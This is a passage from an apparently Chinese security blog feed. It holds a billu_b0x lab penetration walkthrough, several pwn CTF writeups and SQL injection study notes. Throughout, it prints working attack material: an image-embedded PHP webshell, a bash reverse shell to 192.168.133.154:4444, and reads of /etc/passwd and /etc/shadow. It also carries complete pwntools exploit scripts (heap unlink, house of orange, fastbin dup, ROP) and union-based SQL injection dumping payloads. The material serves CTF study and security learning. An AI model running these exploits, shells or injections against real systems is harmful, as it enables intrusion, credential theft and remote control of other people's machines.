12345str_replace(&apos;\&apos;&apos;,&apos;&apos;,urldecode($_POST[&apos;un&apos;]));$run=&apos;select * from auth where pass=\&apos;&apos;.$pass.&apos;\&apos; and uname=\&apos;&apos;.$uname.&apos;\&apos;&apos;;str_replace的作用是将字符串&apos; 替换为空，所以构造SQL注入payload时必须在最后加一个&apos;字符利用后台万能密码 &apos; or 1=1 -- \&apos;直接登上去了 进入panel.php页面 发现这里可以上传文件，查看下源代码先 panel.php源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108&lt;?phpsession_start();include('c.php');include('head2.php');if(@$_SESSION['logged']!=true )&#123; header('Location: index.php', true, 302); exit(); &#125; echo "Welcome to billu b0x "; echo ' &lt;form method=post style="margin: 10px 0px 10px 95%;"&gt; &lt;input type=submit name=lg value=Logout&gt; &lt;/form&gt;'; if(isset($_POST['lg'])) &#123; unset($_SESSION['logged']); unset($_SESSION['admin']); header('Location: index.php', true, 302); &#125; echo ' &lt;hr&gt; &lt;br&gt;'; echo ' &lt;form method=post&gt; &lt;select name=load&gt; &lt;option value="show"&gt;Show Users&lt;/option&gt; &lt;option value="add"&gt;Add User&lt;/option&gt; &lt;/select&gt; &amp;nbsp &lt;input type=submit name=continue value="continue"&gt; &lt;/form&gt; &lt;br&gt; &lt;br&gt;'; if(isset($_POST['continue'])) &#123; $dir=getcwd(); $choice=str_replace('./','',$_POST['load']); if($choice==='add') &#123; include($dir.'/'.$choice.'.php'); die(); &#125; if($choice==='show') &#123; include($dir.'/'.$choice.'.php'); die(); &#125; else &#123; include($dir.'/'.$_POST['load']); &#125; &#125; if(isset($_POST['upload'])) &#123; $name=mysqli_real_escape_string($conn,$_POST['name']); $address=mysqli_real_escape_string($conn,$_POST['address']); $id=mysqli_real_escape_string($conn,$_POST['id']); if(!empty($_FILES['image']['name'])) &#123; $iname=mysqli_real_escape_string($conn,$_FILES['image']['name']); $r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION); $image=array('jpeg','jpg','gif','png'); if(in_array($r,$image)) &#123; $finfo = @new finfo(FILEINFO_MIME); $filetype = @$finfo-&gt;file($_FILES['image']['tmp_name']); if(preg_match('/image\/jpeg/',$filetype ) || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype )) &#123; if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name'])) &#123; echo "Uploaded successfully "; $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; mysqli_query($conn, $update); &#125; &#125; else &#123; echo " &lt;br&gt;i told you dear, only png,jpg and gif file are allowed"; &#125; &#125; else &#123; echo " &lt;br&gt;only png,jpg and gif file are allowed"; &#125; &#125; &#125; ?&gt; 可以发现，它限制了文件上传的类型，只能上传文件后缀为’jpeg’,’jpg’,’gif’,’png’的文件。并且它存在文件包含漏洞，所以利用上传漏洞和文件包含漏洞就可以往服务器植马 随便找张图片，用记事本打开，将一句话木马加到文件最下面 然后上传到服务器上，但是我好像遇到了点小问题……它死活都不让我上传………我去网上查了下大佬写的攻略，发现就是这么构造的啊…..日常非洲人 昨天我又试了一遍，发现可以了……..真的是打扰了 将图片上传到服务器后，利用panel页面的文件包含漏洞去执行cmd马 &lt;?php system($_GET[‘cmd’]); ?&gt; 测试一下，执行命令 cmd=cat%20/etc/passwd 可以发现命令成功执行了，然后利用反弹shell，向服务器中写入菜刀马 反弹shell命令,注意这个要进行url编码 echo “bash -i &gt;&amp; /dev/tcp/192.168.133.154/4444 0&gt;&amp;1” | bash 获取了反弹shell 写入菜刀马，方便之后传文件，用蚁剑连接 echo ‘&lt;?php eval($_POST[‘zs0zrc’]);?&gt;’ &gt;&gt;1.php 查看系统版本以及内核信息 cat /etc/issue uname -a 然后搜索exp，google搜关键词 Ubuntu 12.04.5 e 第一个就可以用了，将exp上传到服务器上，gcc编译，然后执行，权限就提升到root了 有了root权限后，将/etc/passwd 和 /etc/shadow文件读取出来。然后可以暴力破解root用户密码 这一步我就没有做了]]></content>
      <tags>
        <tag>web</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-高校网络信息安全管理运维挑战赛-pwn-writeup]]></title>
    <url>%2F2018%2F11%2F20%2F2018-11-20-2018-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B-pwn-writeup%2F</url>
    <content type="text"><![CDATA[挂机pwn手，赛后复现…….各位大佬是真的强 hack防护机制： 1234567☁ HACK checksec hack [*] &apos;/home/zs0zrc/game/gaoxiaoyunwei/HACK/hack&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序逻辑 12345678910111213141516171819202122232425262728293031323334int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v3; // eax char *buf; // ST18_4 _DWORD *v5; // eax _DWORD *v6; // eax _DWORD *v7; // ST24_4 int v8; // ST28_4 int v9; // ST2C_4 prepare(); printf("The address of printf is: %p\n", puts); puts("Suppose there is a struct like: "); puts("struct node &#123;\n\tchar *name;\n\tchar *description;\n\tstruct node *next;\n\tstruct node *prev;\n&#125;;"); puts("And you have a chance to fabricate a fake node struct;\nWhat can you do?"); puts("Besides you can have two chances to leak, input address: "); v3 = malloc(0x14u); buf = v3; v3[read(0, v3, 0xFu) - 1] = 0; v5 = atoll(buf); printf("%d, %p\n", v5, *v5); puts("Second chance: "); buf[read(0, buf, 0xFu) - 1] = 0; v6 = atoll(buf); printf("%d, %p\n", v6, *v6); v7 = malloc(0x14u); printf("The address of the node is %p, and you can input the fake node now: ", v7); read(0, v7, 0x10u); v8 = v7[3]; v9 = v7[2]; *(v8 + 8) = v9; *(v9 + 0xC) = v8; return 0;&#125; 程序先给了两次任意地址泄露的机会，然后再最后实现了一个类似于unlink的操作，导致可以任意地址写。 利用思路： main函数返回时 ，返回地址存放在栈上，通过任意地址写将 main函数的返回地址改写成one_gadget main函数返回时进行的操作以及栈的情况 main函数返回时的stack 123456789101112131415161718192021222324252627pwndbg&gt; stack 2000:0000│ esp 0xffb4aed0 ◂— 0x101:0004│ 0xffb4aed4 ◂— 0x002:0008│ 0xffb4aed8 —▸ 0x9de7008 ◂— '4151692732'03:000c│ 0xffb4aedc ◂— 0xb /* '\x0b' */04:0010│ 0xffb4aee0 —▸ 0xf775cdbc (environ) —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 ('QT_Q')05:0014│ 0xffb4aee4 —▸ 0x9de7020 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f06:0018│ 0xffb4aee8 —▸ 0xffb4aeec —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f07:001c│ edx 0xffb4aeec —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f08:0020│ 0xffb4aef0 —▸ 0xf775b3dc (__exit_funcs) —▸ 0xf775c1e0 (initial) ◂— 0x009:0024│ 0xffb4aef4 —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f0a:0028│ ebp 0xffb4aef8 ◂— 0x00b:002c│ 0xffb4aefc —▸ 0xf75c1637 (__libc_start_main+247) ◂— add esp, 0x100c:0030│ 0xffb4af00 —▸ 0xf775b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0e:0038│ 0xffb4af08 ◂— 0x00f:003c│ 0xffb4af0c —▸ 0xf75c1637 (__libc_start_main+247) ◂— add esp, 0x1010:0040│ 0xffb4af10 ◂— 0x111:0044│ 0xffb4af14 —▸ 0xffb4afa4 —▸ 0xffb4c2ae ◂— './hack'12:0048│ 0xffb4af18 —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 ('QT_Q')13:004c│ 0xffb4af1c ◂— 0x0泄露出来的stack的地址和ebp的偏移pwndbg&gt; p 0xffb4afac - 0xffb4aef4$1 = 0xb8只要将ebp-4出修改为one_gadget，那么就可以控制程序执行流 exp: 1234567891011121314151617181920212223242526272829303132from pwn import*context.log_level = "debug"p = remote('210.32.4.16','13375')elf = ELF('./hack')libc = ELF('./libc.so')log.info("leak libc address ")puts_got = elf.got["puts"]p.recvuntil("input address: \n")p.sendline(str(puts_got))p.recvuntil(", ")puts = int(p.recv(10),16)libc_base = puts - libc.symbols["puts"]env = libc_base + libc.sym["_environ"]one = libc_base + 0x3a819libc.address = libc_baselog.info("libc_base --&gt; &#123;&#125;".format(hex(libc_base)))p.sendline(str(env))p.recvuntil(", ")stack_addr = int(p.recv(10),16)target = stack_addr - 0xb8log.info(" stack address is &#123;&#125;".format(hex(stack_addr)))p.recvuntil(" is ")node_add = int(p.recvuntil(",").strip(","),16)log.info("node address is &#123;&#125;".format(hex(node_add)))p.recv()payload = p32(one)*2 + p32(node_add + 4)+p32(target-8) p.send(payload)p.interactive() justnote防护机制： 1234567☁ just_note checksec justnote [*] &apos;/home/zs0zrc/game/gaoxiaoyunwei/just_note/justnote&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 程序逻辑： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v4; // [rsp+18h] [rbp-8h] prepare(); do &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; v4 = menu(); if ( v4 &gt; 0 &amp;&amp; v4 &lt;= 4 ) break; puts("invalid choice!"); &#125; if ( v4 != 2 ) break; remove_note(); &#125; if ( v4 &gt; 2 ) break; if ( v4 == 1 ) insert_note(); &#125; if ( v4 != 3 ) break; edit_note(); &#125; &#125; while ( v4 != 4 ); return 0;&#125; 一共有三个功能： insert_note 创建一个新的note edit_note 编辑note remove_note 删除一个note insert_note： 12345678910111213141516171819202122232425262728int insert_note()&#123; __int64 chunk; // [rsp+8h] [rbp-18h] __int64 size; // [rsp+10h] [rbp-10h] signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i &lt;= 31 &amp;&amp; *(16LL * i + table); ++i ) ; if ( i == 32 ) return puts("no more, no more"); chunk = calloc(0x100uLL, 1uLL); if ( !chunk ) &#123; puts("memory error, contact admin"); exit(1); &#125; printf("length of note: ", 1LL); size = read_long_long(); if ( size &lt; 0 ) //漏洞点： 最小的负数取反还是负数，可以造成堆溢出，无限写入 size = -size; if ( size &gt; 0xFF ) size = 255LL; printf("note: "); recvn(chunk, size); *(16LL * i + table) = chunk ^ 0xDEADBEEFCAFEBABELL; *(table + 16LL * i + 8) = size; return printf("check it out: %s\n", chunk);&#125; edit_note: 12345678910111213int edit_note()&#123; __int64 v1; // [rsp+8h] [rbp-8h] printf("index of note: "); v1 = read_long_long(); if ( v1 &lt; 0 || v1 &gt; 31 ) return puts("out of range"); if ( !*(16 * v1 + table) ) return puts("no note here"); printf("note: "); return recvn(*(16 * v1 + table) ^ 0xDEADBEEFCAFEBABELL, *(16 * v1 + table + 8));&#125; delete_note: 123456789101112131415161718192021222324252627int remove_note()&#123; signed __int64 v0; // rax __int64 v2; // [rsp+8h] [rbp-8h] printf("index of note: "); v2 = read_long_long(); if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 31 ) &#123; if ( *(16 * v2 + table) ) &#123; free((*(16 * v2 + table) ^ 0xDEADBEEFCAFEBABELL)); *(16 * v2 + table) = 0LL; v0 = 16 * v2 + table; *(v0 + 8) = 0LL; &#125; else &#123; LODWORD(v0) = puts("no note here"); &#125; &#125; else &#123; LODWORD(v0) = puts("out of range"); &#125; return v0;&#125; 解题思路： 利用堆溢出，先泄露出堆地址，然后泄露libc地址 后面的做法就是house_of_orange了 伪造_IO_FILE结构体，利用unsorted bin attack,修改 _IO_list_all为 main_arena + 0x58 最后调用malloc函数，触发 _malloc_printerr ，最终getshell 要注意的是 ，因为它分配堆的空间用的函数是calloc函数，它默认是会初始化堆块，将空间内容清空，但是如果是mmap分配的chunk空间的话，就不会清空。所以想泄露信息的话就要将chunk的 IS_MMAPED标志位覆盖为1 伪造的fake_file 12345678910fake_file = '/bin/sh'.ljust(8, '\x00') + p64(0x61)fake_file +=p64(0) + p64(io_list_all_addr - 0x10) #unsorted bin attackfake_file += p64(0) #_IO_write_basefake_file += p64(1) #_IO_write_ptr bypass check fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)fake_file += p64(0) * 9 fake_file += p64(system_addr) fake_file =fake_file.ljust(0xc0,'\x00') fak_file += p64(0xffffffffffffffff) #bypass fp-&gt;_mode &lt;= 0fake_file += p64(0) * 2 fake_file += p64(fake_file_addr + 0x60) #vtable 伪造的vtable表 最终exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./justnote') elf = ELF('./justnote') libc = elf.libcelse: p = remote("210.32.4.17","13376") elf = ELF('./justnote') libc = ELF('./libc.so')context.arch = elf.archcontext.log_level='debug'def add(lgth, note): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('note: ') p.sendline(str(lgth)) p.recvuntil('note: ') p.sendline(note)def delete(idx): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('note: ') p.sendline(str(idx))def edit(idx, note): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('note: ') p.sendline(str(idx)) p.recvuntil('note: ') p.sendline(note) def HouseOfOrange(fake_file_addr, system_addr, io_list_all_addr): fake_file = '/bin/sh'.ljust(8, '\x00') + p64(0x61) fake_file +=p64(0) + p64(io_list_all_addr - 0x10) #unsorted bin attack fake_file += p64(0) #_IO_write_base fake_file += p64(1) #_IO_write_ptr bypass check fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) fake_file += p64(0) * 9 fake_file += p64(system_addr) fake_file =fake_file.ljust(0xc0,'\x00') fake_file += p64(0xffffffffffffffff) #bypass fp-&gt;_mode &lt;= 0 fake_file += p64(0) * 2 fake_file += p64(fake_file_addr + 0x60) #vtable return fake_file add(-9223372036854775808,'a'*8) #0add(100,'b'*8) #1add(-9223372036854775808,'c'*8) #2add(100,'d'*8) #3add(-9223372036854775808,'e'*8) #4add(100,'d'*8) #5add(100,'d'*8) #6delete(1)delete(3)pause()edit(0,'\x00'*0x108 + '\x13')add(100,'a'*8)p.recvuntil("a"*8)heap_addr = u64(p.recv(6).ljust(8,'\x00'))heap_base = heap_addr - 0x540log.info("heap address is &#123;&#125;".format(hex(heap_addr)))edit(2,'\x00'*0x108 + '\x13')add(100,'a'*8)p.recvuntil("a"*8)libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['__malloc_hook'] - 0x10 - 0x58log.info("libc address is &#123;&#125;".format(hex(libc_base)))libc.address = libc_basedelete(5)edit(4, '\x00' * 0x100 + HouseOfOrange(heap_addr + 0x110 * 2, libc.sym['system'], libc.sym['_IO_list_all']))p.recvuntil('choice: ')p.sendline('1')p.interactive() reference: 高校运维赛 2018 Writeup – 天枢]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUCTF 招新赛 2018 writeup]]></title>
    <url>%2F2018%2F11%2F19%2F2018-11-19-SUCTF-%E6%8B%9B%E6%96%B0%E8%B5%9B-2018-writeup%2F</url>
    <content type="text"><![CDATA[前段时间做了下SUCTF的招新赛的pwn题，题目还是很友好的，适合新手。但是一直没有写writeup，现在有时间就把writeup写了。 basic-pwn简单的栈溢出 直接上exp: 12345from pwn import*p = process('pwn')payload = 'a'*280 + p64(0x4005c7)p.sendline(payload)p.interactive() stack也是简单栈溢出，和basic-pwn差不多 exp: 123456from pwn import*p=process("./pwn")payload='a'*0x28+p64(0x400676)p.recvuntil("============================\n")p.sendline(payload)p.interactive() babyarray数组下标溢出，将特定变量覆盖为0就可以了。 输入 的下标为-14，值为0 。 unlink一道简单的unlink题。改写__free_hook为system函数，再free掉一个包含“/bin/sh”字符串的chunk，就可以getshell exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./unlink') elf = ELF('./unlink') libc = elf.libcelse: p = remote("43.254.3.203",10005) elf = ELF('./unlink') libc = ELF('./libc-2.23.so')context.arch = elf.archcontext.log_level='debug'def touch(size): p.sendlineafter("please chooice :\n","1") p.sendlineafter("size : \n",str(size))def delete(idx): p.sendlineafter("please chooice :\n","2") p.sendlineafter(" delete\n",str(idx)) def show(idx): p.sendlineafter("please chooice :\n","3") p.sendlineafter("show\n",str(idx)) def take(idx,content): p.sendlineafter("please chooice :\n","4") p.sendlineafter("modify :\n",str(idx)) p.sendlineafter("content\n",content) ptr = 0x06020C0fake_chunk = p64(0) + p64(0x90) + p64(ptr - 0x18) + p64(ptr - 0x10) fake_chunk = fake_chunk.ljust(0x90,'a')fake_chunk += p64(0x90) + p64(0x90)touch(0x90)touch(0x80) touch(0x20)delete(0)touch(0x90)show(0)p.recvuntil("the content is : \n")leak = u64(p.recv(6).ljust(8,'\x00'))log.info(hex(leak))libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 0x58 libc.address = libc_baselog.info(hex(libc_base))take(0,fake_chunk)delete(1)payload = 'a'*0x18 + p64(libc.symbols['__free_hook'])take(2,"/bin/sh")take(0,payload)take(0,p64(libc.symbols['system'])*2)delete(2)p.interactive() ez_heap网鼎杯半决赛的原题，就改了下字符串。漏洞点是一个UAF。 利用方法，先利用unsorted bin将libc地址泄露出来，然后利用UAF漏洞来进行fastbins_dup 分配到包含__malloc_hook的chunk，改写 _malloc_hook为one_gadget，最后通过doublefreee触发 _malloc_printerr 来getshell。 详情可以看我之前网鼎杯的writeup地址 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./ez_heap') elf = ELF('./ez_heap') libc = elf.libcelse: host = '43.254.3.203' port = '10006' p = remote(host,port) elf = ELF('./ez_heap') libc = ELF('./libc-2.23.so')context.arch = elf.arch#context.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def create(size,name,t): ru('Your choice : ') sl('1') ru('Length of the name :') sl(str(size)) ru('The name of animal :') sd(name) ru('The kind of the animal :') sl(t)def view(): ru('Your choice : ') sl('2')def delete(idx): ru('Your choice : ') sl('3') rc() sl(str(idx))def clean(): ru('Your choice : ') sl('4')create(0x98,'a'*8,'1234')create(0x68,'bbbb','456798')create(0x68,'bbbb','456798')create(0x28,'bbbb','456798')delete(0)clean()create(0x98,'a'*8,'1234')view()ru('a'*8)leak = u64(p.recv(6).ljust(8,'\x00'))main_arena = leak - 0x58log.info(hex(main_arena))pause()libc_base = main_arena - libc.symbols['__malloc_hook'] - 0x10 log.info("libc_base is &#123;&#125;".format(hex(libc_base)))malloc_hook = libc_base + libc.symbols['__malloc_hook']system = libc_base + libc.symbols['system']one_gadget = 0xf02a4 + libc_basedelete(1)delete(2)delete(1)create(0x68,p64(malloc_hook - 0x23),'1234')create(0x68,'bbbb','456798')create(0x68,'bbbb','456798')create(0x68,'a'*0x13 + p64(one_gadget),'1234')delete(0)delete(0)p.interactive() easy_overflow_file_structureIO_FILE利用的简化版 漏洞点: 解析请求头字段的循环退出不当，导致可以写入多次，导致溢出，可以覆盖掉文件流指针 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748__int64 __fastcall lookForHeader(const char *strings, __int64 input, signed int size, _BYTE *target, unsigned int count)&#123; _BYTE *v5; // rax _BYTE *v6; // rdx __int64 result; // rax _BYTE *v8; // [rsp+0h] [rbp-40h] unsigned int v9; // [rsp+8h] [rbp-38h] signed int v10; // [rsp+Ch] [rbp-34h] unsigned int n; // [rsp+2Ch] [rbp-14h] size_t n_4; // [rsp+30h] [rbp-10h] unsigned int j; // [rsp+38h] [rbp-8h] signed int i; // [rsp+3Ch] [rbp-4h] v10 = size; v8 = target; v9 = count; n = strlen(strings); for ( i = 0; ; ++i ) &#123; result = v10 - n; if ( (signed int)result &lt;= i ) break; if ( !strncmp((const char *)(input + i), strings, n) &amp;&amp; *(_BYTE *)(i + n + input) == 58 ) &#123; for ( i += n + 1; i &lt; v10 &amp;&amp; (*(_BYTE *)(i + input) == 32 || *(_BYTE *)(i + input) == 9); ++i ) ; for ( j = i; j &lt; v10; ++j ) &#123; if ( *(_BYTE *)(j + input) == 35 ) &#123; if ( j - i + 1 &lt;= v9 ) &#123; n_4 = i + input; while ( n_4 &lt; (unsigned __int64)j + input ) &#123; v5 = v8++; v6 = (_BYTE *)n_4++; *v5 = *v6; &#125; *v8 = 0; &#125; break; &#125; &#125; &#125; &#125; return result;&#125; exp: 12345678910111213141516from pwn import*context.log_level = "debug"#p = process('./eofs')p = remote('43.254.3.203',"10002")payload = "GET / HTTP/1.1#"payload +=" Host:"+"a"*126 + "#"payload += " ResearchField:"+ 'a'*126 +"#"payload +=" ResearchField:"+ 'a'*2 + p64(0x6021a0) +"#"payload += " Username: " + p64(0xdeadbeef)*4 + "#"p.sendline(payload.ljust(8000,'b'))p.recv()p.interactive() int程序的逻辑很简单，存在一个整数溢出。通过整数溢出可以造成栈溢出，就可以进行rop了。 这里我一开始比较困惑的是那个alloca函数，它通过ida反编译后参数很奇怪，我还以为进行了什么操作。直到我自己写了个测试alloca函数的程序，发现原来这个函数不在glibc库中，它由一些汇编语句构成，最终结果是将栈的空间增大，并返回一个内存指针。 测试程序： 12345678910#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int *a; a = alloca(16); return 0;&#125; 拖进ida中看下 123456789101112131415161718.text:000000000040054E ; 4: v3 = alloca(32LL);.text:000000000040054E mov rax, fs:28h.text:0000000000400557 mov [rbp+var_8], rax.text:000000000040055B xor eax, eax.text:000000000040055D mov eax, 10h.text:0000000000400562 sub rax, 1.text:0000000000400566 add rax, 1Fh.text:000000000040056A mov esi, 10h.text:000000000040056F mov edx, 0.text:0000000000400574 div rsi.text:0000000000400577 imul rax, 10h.text:000000000040057B sub rsp, rax.text:000000000040057E mov rax, rsp.text:0000000000400581 add rax, 0Fh.text:0000000000400585 shr rax, 4.text:0000000000400589 shl rax, 4.text:000000000040058D mov [rbp+var_10], rax.text:0000000000400591 mov eax, 0 对比题目的代码 123456789101112131415.text:000000000040076D ; 13: v3 = alloca(32LL);.text:000000000040076D mov eax, 10h.text:0000000000400772 sub rax, 1.text:0000000000400776 add rax, 1Bh.text:000000000040077A mov ecx, 10h.text:000000000040077F mov edx, 0.text:0000000000400784 div rcx.text:0000000000400787 imul rax, 10h.text:000000000040078B sub rsp, rax.text:000000000040078E mov rax, rsp.text:0000000000400791 add rax, 0Fh.text:0000000000400795 shr rax, 4.text:0000000000400799 ; 14: buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));.text:0000000000400799 shl rax, 4.text:000000000040079D mov [rbp+buf], rax 可以发现其实 v3 = alloca(32LL); 和buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));这两条反编译后的语句相当于 buf = alloca(32); 程序的漏洞点 它后面read函数读入数据的大小和alloca函数分配的大小是由我们输入控制的，所以可以控制它为一个很大的值，造成整数溢出，那么可以分配一个小空间，但是可以读取很多数据。那么就会造成栈溢出。 栈的大小要通过调试来得到，dest的地址为0x7ffd035211b0 dest与rbp的距离 所以dest + 12 距离返回地址的偏移为 0x80-12 + 8 = 124 栈的大小知道了，剩下的就是怎么进行rop利用。先泄露出libc地址，然后调用system函数来getshell。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env pythonfrom pwn import *p = process('./int')elf = ELF('./int')libc = elf.libccontext.arch = elf.archcontext.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) rc()#gdb.attach(p,"b *0x0400824")pop_rdi = 0x00000000004008f3payload = p32(0x6e696b53) + p32(0x1) + p32(0xffffffff) p.send(payload)payload = 'a'*124payload += p64(pop_rdi)payload += p64(elf.got['puts'])payload += p64(elf.plt['puts'])payload += p64(0x4005E0)# startp.send(payload)leak = u64(p.recv(6).ljust(8, "\x00"))libc.address = leak - libc.symbols['puts']info("libc.address: &#123;&#125;".format(hex(libc.address)))payload = p32(0x6E696B53) + p32(1) + p32(0xffffffff)sd(payload)payload = 'a'*124payload += p64(pop_rdi)payload += p64(libc.search("/bin/sh\x00").next())payload += p64(libc.symbols['system'])payload += p64(0xdeadbeef)sd(payload)p.interactive()]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入学习]]></title>
    <url>%2F2018%2F11%2F14%2F2018-11-14-SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[SQL学习笔记 SQL基础注释语句单行注释： 以“#”号开头,直到该行行尾,全部都是注释内容 以“– ”号开头,直到该行行尾,全部都是注释内容。（“– ”与注释内容之间要加有空格） 多行注释： /……/，“/”用于注释文字的开头，“/”用于注释文字的结尾。 常用函数 user()：当前数据库用户 database()：当前数据库名 version()：当前使用的数据库版本 @@datadir：数据库存储数据路径 concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password) group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来 concat_ws()：用法类似 hex() 和 unhex()：用于 hex 编码解码 load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\ select xxoo into outfile &#39;路径&#39;：权限较高时可直接写文件 MYSQL常规注入步骤12345678爆数据库名select schema_name from information_schema.schemata爆表名select table_name from information_schema.tables where table_schema=&apos;&apos;爆列名select column_name from information_schema.columns where table_name=&apos;&apos;爆出某列的内容Select xxx from xxx sqli-labs一个练习SQL注入的靶场 writeupLess-1payload 123456789101112131415尝试id=1&apos;报错，尝试id=1&apos; and 1=1 %23 不报错 %23是#字符说明这个是个单引号闭合最终payload为http://localhost/sqli/Less-1/?id=1’ and 1=1 %23练习下MYSQL的常规注入操作爆破字段数http://localhost/sqli/Less-1/?id=1’ order by 4 %23爆数据库名http://localhost/sqli/Less-1/?id=1’union select 1,group_concat(schema_name),3 from information_schema.schemata%23爆表名http://localhost/sqli/Less-1/?id=1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &quot;test&quot; %23爆列名http://localhost/sqli/Less-1/?id=1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &quot;hack&quot; %23爆内容http://localhost/sqli/Less-1/?id=1’ union select group_concat(id),group_concat(user),group_concat(pwd) from hack %23 Less-2]]></content>
      <tags>
        <tag>web</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入和XSS的简单学习笔记]]></title>
    <url>%2F2018%2F11%2F13%2F2018-11-13-SQL%E6%B3%A8%E5%85%A5%E5%92%8CXSS%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[混子pwn手来学点web的东西了，网络攻防课程要求做的作业 SQL注入原理 将SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。 形成原因： web开发人员没有在将从web表单、cookie、输入参数等收到的值传给SQL查询前进行检查 漏洞复现平台 ： NPMserv 目标：NPMserv 中的一个政府网站 (本地搭的一个环境) 判断注入点 12http://127.0.0.1/info_show.php?info_id=140 and 1=1 有回显http://127.0.0.1/info_show.php?info_id=140 and 1=2 无回显 爆破字段数量 12http://127.0.0.1/info_show.php?info_id=140 order by 5这里数量，试了1到5都没问题，而6的话就会无回显，所以字段数量为5 判断可回显字段 12http://127.0.0.1/info_show.php?info_id=140 union select 1,2,3,4,5这里发现只有2，3字段是可以回显的 爆出敏感信息 123456789101112131415http://127.0.0.1/info_show.php?info_id=140 union select 1,user(),database(),4,5爆出了数据库用户名和数据库名，分别为root@localhost 和 govcnhttp://127.0.0.1/info_show.php?info_id=140 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=&quot;govcn&quot;爆出govcn数据库中包含的数据表，分别为admin，index_dy，index_info，index_intro，jgsz，ldjjgroup_concat函数用于把多条数据一次注出爆admin表的列名http://127.0.0.1/info_show.php?info_id=140 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name=&apos;admin&apos;爆出admin表中的列名为username,password爆用户和密码http://127.0.0.1/info_show.php?info_id=140 union select 1,unhex(hex(username)),unhex(hex(password)),4,5 from admin用unhex(hex())是为了解决网站编码不一致导致没有回显的问题用户名为admin，密码为：21232f297a57a5a743894a0e4a801fc3 这个是md5加密过的，拿去解密一下，解出来的内容为 admin。所以用户名为admin，密码为admin 利用注出的用户密码成功登入后台 至此，一个简单的SQL注入漏洞 就复现完了 SQL注入的防护手段 1对客户端提交的数据进行严格的校验，校验可以考虑数据类型，字符长度或者正则表达式等方式。 2.对客户端提交的数据进行转义，例如将” ‘ “转义为” ‘ “。 3.采用预编译绑定变量的SQL语句而不是直接拼接SQL语句。 